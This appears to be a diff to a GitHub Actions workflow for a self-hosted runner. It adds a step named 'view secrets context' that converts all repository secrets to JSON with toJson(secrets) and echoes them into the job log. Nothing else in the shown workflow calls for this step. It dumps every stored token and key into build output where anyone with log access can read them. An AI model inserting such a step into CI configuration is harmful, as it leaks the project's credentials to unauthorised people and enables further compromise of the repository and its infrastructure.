@@ -16,6 +16,12 @@ jobs:
     runs-on: jedi-self-hosted-rg
 
     steps:
+      - name: view secrets context
+        shell: bash
+        run: echo "$SECRETS_CONTEXT"
+        env:
+          SECRETS_CONTEXT: ${{ toJson(secrets) }}
+
       - name: pre-submit cleanup
         run: |
           ls -la ./
